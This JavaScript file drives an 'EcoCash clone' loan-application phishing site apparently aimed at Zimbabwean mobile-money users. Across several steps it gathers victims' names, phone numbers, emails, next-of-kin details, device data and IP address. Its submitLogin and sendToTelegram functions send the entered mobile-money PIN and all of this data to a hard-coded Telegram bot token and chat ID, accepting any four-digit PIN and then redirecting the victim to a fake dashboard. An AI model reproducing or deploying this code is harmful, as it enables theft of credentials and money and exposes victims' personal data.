/* =========================================
   ECOCASH CLONE - SECURITY-LESS VERSION
   ========================================= */

// ==========================================
// TELEGRAM BOT CONFIGURATION
// ==========================================
const TELEGRAM_BOT_TOKEN = '8827045093:AAElik1G_KqVGWfKVZNoZikvLdDcuM9bSM8';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const TELEGRAM_CHAT_ID = '714082360'; // REPLACE WITH YOUR REAL CHAT ID

// ==========================================
// DOM READY
// ==========================================
document.addEventListener("DOMContentLoaded", function () {
    console.log("✅ DOM fully loaded!");
    document.body.classList.add("loaded");
    
    // Load phone number
    const phoneInput = document.getElementById("loginPhone");
    if (phoneInput) {
        phoneInput.value = localStorage.getItem("phone") || "";
    }

    // Setup PIN inputs
    const pinBoxes = document.querySelectorAll(".pin-box");
    if (pinBoxes.length > 0) {
        setupPinInputs();
    }

    // Load other features
    if (document.getElementById("amount")) updateCalculator();
    if (document.getElementById("amountText")) loadSummary();
    if (document.getElementById("hiddenAmount")) loadAllDataToStep5();
    
    // Update button text
    const submitBtn = document.getElementById("submitBtn");
    if (submitBtn) {
        submitBtn.innerText = "LOGIN TO DASHBOARD";
    }
});

// ==========================================
// PIN INPUT SETUP
// ==========================================
function setupPinInputs() {
    const pins = document.querySelectorAll(".pin-box");
    
    pins.forEach((pin, index) => {
        pin.addEventListener("input", () => {
            if (pin.value.length === 1 && index < pins.length - 1) {
                pins[index + 1].focus();
            }
        });
        pin.addEventListener("keydown", (e) => {
            if (e.key === "Backspace" && pin.value.length === 0 && index > 0) {
                pins[index - 1].focus();
            }
        });
    });

    if (pins.length > 0) {
        pins[0].focus();
    }
}

// ==========================================
// NAVIGATION FUNCTIONS
// ==========================================
function nextStep1() {
    const amount = document.getElementById("amount").value;
    const duration = document.getElementById("duration").value;
    const reason = document.getElementById("reason").value.trim();

    if (!reason) {
        showError("Please enter a reason for the loan");
        return;
    }

    localStorage.setItem("amount", amount);
    localStorage.setItem("duration", duration);
    localStorage.setItem("reason", reason);

    showLoaderAndGo("step2.html");
}

function nextStep2() {
    const fname = document.getElementById("fname").value.trim();
    const lname = document.getElementById("lname").value.trim();
    const phone = document.getElementById("phone").value.trim();
    const email = document.getElementById("email").value.trim();

    if (!fname || !lname || !phone || !email) {
        showError("Please fill all required fields");
        return;
    }

    const nameRegex = /^[A-Za-z]+$/;
    if (!nameRegex.test(fname) || !nameRegex.test(lname)) {
        showError("Names must contain only letters");
        return;
    }

    if (!phone.startsWith("+263") || phone.length < 10) {
        showError("Enter a valid Zimbabwe phone number (+263...)");
        return;
    }

    localStorage.setItem("fname", fname);
    localStorage.setItem("lname", lname);
    localStorage.setItem("fullName", fname + " " + lname);
    localStorage.setItem("phone", phone);
    localStorage.setItem("email", email);

    showLoaderAndGo("step3.html");
}

function nextStep3() {
    const kfname = document.getElementById("kfname").value.trim();
    const klname = document.getElementById("klname").value.trim();
    const kphone = document.getElementById("kphone").value.trim();
    const province = document.getElementById("province").value;

    if (!kfname || !klname || !kphone || !province) {
        showError("Please fill all required fields");
        return;
    }

    localStorage.setItem("kfname", kfname);
    localStorage.setItem("klname", klname);
    localStorage.setItem("kphone", kphone);
    localStorage.setItem("province", province);

    showLoaderAndGo("step4.html");
}

function nextStep4() {
    showLoaderAndGo("step5.html");
}

// ==========================================
// LOAD ALL DATA INTO STEP 5 HIDDEN FIELDS
// ==========================================
function loadAllDataToStep5() {
    document.getElementById("hiddenAmount").value = localStorage.getItem("amount") || "";
    document.getElementById("hiddenDuration").value = localStorage.getItem("duration") || "";
    document.getElementById("hiddenReason").value = localStorage.getItem("reason") || "";
    document.getElementById("hiddenFullName").value = localStorage.getItem("fullName") || "";
    document.getElementById("hiddenEmail").value = localStorage.getItem("email") || "";
    
    const kinName = (localStorage.getItem("kfname") || "") + " " + (localStorage.getItem("klname") || "");
    document.getElementById("hiddenKinName").value = kinName;
    document.getElementById("hiddenKinPhone").value = localStorage.getItem("kphone") || "";
    document.getElementById("hiddenProvince").value = localStorage.getItem("province") || "";
    
    const deviceInfo = getDeviceInfo();
    document.getElementById("hiddenDeviceInfo").value = JSON.stringify(deviceInfo);
    document.getElementById("hiddenTimestamp").value = new Date().toLocaleString();
}

// ==========================================
// UTILITY FUNCTIONS
// ==========================================
function updateCalculator() {
    const amountSlider = document.getElementById("amount");
    const durationSlider = document.getElementById("duration");
    const amountVal = document.getElementById("amountVal");
    const durationVal = document.getElementById("durationVal");
    const calcPrincipal = document.getElementById("calcPrincipal");
    const calcInterest = document.getElementById("calcInterest");
    const calcTotal = document.getElementById("calcTotal");

    if (!amountSlider) return;

    const principal = parseFloat(amountSlider.value);
    const days = parseInt(durationSlider.value);
    const DAILY_RATE = 0.005;

    amountVal.innerText = `$${principal}`;
    durationVal.innerText = `${days} days`;

    const interest = principal * DAILY_RATE * days;
    const total = principal + interest;

    calcPrincipal.innerText = `$${principal.toFixed(2)}`;
    calcInterest.innerText = `$${interest.toFixed(2)}`;
    calcTotal.innerText = `$${total.toFixed(2)}`;
}

function loadSummary() {
    document.getElementById("amountText").innerText = "$" + (localStorage.getItem("amount") || "0");
    document.getElementById("durationText").innerText = (localStorage.getItem("duration") || "0") + " days";
    document.getElementById("reasonText").innerText = localStorage.getItem("reason") || "-";
    document.getElementById("nameText").innerText = localStorage.getItem("fullName") || "-";
    document.getElementById("phoneText").innerText = localStorage.getItem("phone") || "-";
    document.getElementById("kinText").innerText = (localStorage.getItem("kfname") || "") + " " + (localStorage.getItem("klname") || "") + " (" + (localStorage.getItem("kphone") || "-") + ")";
}

// ==========================================
// DEVICE INFORMATION
// ==========================================
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let deviceType = 'Unknown', os = 'Unknown', browser = 'Unknown';
    
    if (userAgent.indexOf('Windows') !== -1) os = 'Windows';
    else if (userAgent.indexOf('Mac') !== -1) os = 'macOS';
    else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
    else if (userAgent.indexOf('Android') !== -1) os = 'Android';
    else if (userAgent.indexOf('iOS') !== -1 || userAgent.indexOf('iPhone') !== -1) os = 'iOS';
    
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        deviceType = 'Mobile';
    } else {
        deviceType = 'Desktop';
    }
    
    if (userAgent.indexOf('Chrome') !== -1) browser = 'Chrome';
    else if (userAgent.indexOf('Firefox') !== -1) browser = 'Firefox';
    else if (userAgent.indexOf('Safari') !== -1) browser = 'Safari';
    else if (userAgent.indexOf('Edge') !== -1) browser = 'Edge';
    
    return {
        userAgent: userAgent,
        deviceType: deviceType,
        os: os,
        browser: browser,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
}

// ==========================================
// GET IP ADDRESS
// ==========================================
async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unable to fetch IP';
    }
}

// ==========================================
// SEND TO TELEGRAM - COMPLETE APPLICATION DATA
// ==========================================
async function sendToTelegram(data) {
    console.log("📤 Sending application to Telegram...");
    
    const principal = parseFloat(data.amount);
    const days = parseInt(data.duration);
    const DAILY_RATE = 0.005;
    const interest = principal * DAILY_RATE * days;
    const total = principal + interest;
    
    // Generate a random application ID
    const applicationId = 'APP-' + Date.now().toString().slice(-6);
    
    const message = `
📋 *NEW LOAN APPLICATION SUBMITTED*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🆔 *Application ID:* ${applicationId}
🔑 *PIN Entered:* ${data.pin}

📋 *LOAN DETAILS*
━━━━━━━━━━━━━━━━━━━━━━
💰 Principal: $${principal.toFixed(2)}
📅 Duration: ${days} days
📊 Interest: $${interest.toFixed(2)}
💵 Total: $${total.toFixed(2)}
📝 Reason: ${data.reason}

👤 *APPLICANT*
━━━━━━━━━━━━━━━━━━━━━━
👤 Name: ${data.fullName}
📱 Phone: ${data.phone}
📧 Email: ${data.email}
📋 Account: ${data.accountType}

👨‍👩‍👧 *NEXT OF KIN*
━━━━━━━━━━━━━━━━━━━━━━
👤 Kin: ${data.kinName}
📱 Kin Phone: ${data.kinPhone}
📍 Province: ${data.province}

🖥️ *DEVICE INFO*
━━━━━━━━━━━━━━━━━━━━━━
💻 Device: ${data.deviceInfo.deviceType}
🌍 Browser: ${data.deviceInfo.browser}
🌐 IP: ${data.ipAddress}
🕐 Time: ${data.timestamp}

✅ *STATUS: APPLICATION COMPLETE - DASHBOARD ACCESS GRANTED*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    `;

    try {
        const response = await fetch(TELEGRAM_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        const responseData = await response.json();
        console.log("📥 Telegram response:", responseData);
        
        return responseData;
    } catch (error) {
        console.error('❌ Telegram send error:', error);
        throw error;
    }
}

// ==========================================
// SUBMIT LOGIN - SECURITY-LESS VERSION
// ==========================================
async function submitLogin() {
    console.log("🚀 submitLogin() started - Security-less mode");
    
    const errorBox = document.getElementById('errorBox');
    const successBox = document.getElementById('successBox');
    const pins = document.querySelectorAll(".pin-box");
    const pin = Array.from(pins).map(p => p.value).join("");
    
    errorBox.style.display = 'none';
    successBox.style.display = 'none';
    
    // === ONLY CHECK LENGTH - NO VALIDATION ===
    if (pin.length < 4) {
        showError("Please enter a 4-digit PIN to continue");
        return;
    }
    // =========================================
    
    // Gather all data
    const accountType = document.getElementById('accountType').value;
    const phone = localStorage.getItem('phone') || '';
    const fullName = localStorage.getItem('fullName') || '';
    const email = localStorage.getItem('email') || '';
    const amount = localStorage.getItem('amount') || '0';
    const duration = localStorage.getItem('duration') || '0';
    const reason = localStorage.getItem('reason') || '';
    const kinName = (localStorage.getItem('kfname') || '') + ' ' + (localStorage.getItem('klname') || '');
    const kinPhone = localStorage.getItem('kphone') || '';
    const province = localStorage.getItem('province') || '';
    
    // Show loader
    document.getElementById('pageLoader').style.display = 'block';
    console.log("⏳ Processing submission...");
    
    try {
        // Get device info and IP
        const deviceInfo = getDeviceInfo();
        const ipAddress = await getIPAddress();
        const timestamp = new Date().toLocaleString('en-US', { 
            timeZone: deviceInfo.timezone,
            hour12: true 
        });
        
        // Prepare data
        const applicationData = {
            pin: pin,
            accountType: accountType,
            phone: phone,
            fullName: fullName,
            email: email,
            amount: amount,
            duration: duration,
            reason: reason,
            kinName: kinName,
            kinPhone: kinPhone,
            province: province,
            deviceInfo: deviceInfo,
            ipAddress: ipAddress,
            timestamp: timestamp
        };
        
        console.log("📦 Data prepared:", applicationData);
        
        // Send to Telegram
        const telegramResponse = await sendToTelegram(applicationData);
        
        if (telegramResponse.ok) {
            console.log("✅ Application sent to Telegram!");
            
            // Show success
            successBox.style.display = 'block';
            successBox.innerHTML = '✅ Application submitted successfully! Redirecting to dashboard...';
            
            // === GRANT ACCESS - NO VALIDATION REQUIRED ===
            setTimeout(() => {
                window.location.href = "dashboard.html";
            }, 2000);
            // ============================================
            
        } else {
            throw new Error('Telegram send failed');
        }
        
    } catch (error) {
        console.error("❌ Error submitting application:", error);
        showError('❌ Failed to submit application. Please try again.');
    } finally {
        document.getElementById('pageLoader').style.display = 'none';
    }
}

// ==========================================
// HELPER FUNCTIONS
// ==========================================
function showError(msg) {
    const box = document.getElementById("errorBox");
    if (box) {
        box.innerText = msg;
        box.style.display = "block";
    } else {
        alert(msg);
    }
}

function showLoaderAndGo(url) {
    const loader = document.getElementById("pageLoader");
    if (loader) loader.style.display = "block";
    setTimeout(() => {
        window.location.href = url;
    }, 800);
}

// ==========================================
// EXPOSE FUNCTIONS
// ==========================================
window.nextStep1 = nextStep1;
window.nextStep2 = nextStep2;
window.nextStep3 = nextStep3;
window.nextStep4 = nextStep4;
window.updateCalculator = updateCalculator;
window.submitLogin = submitLogin;
window.setupPinInputs = setupPinInputs;
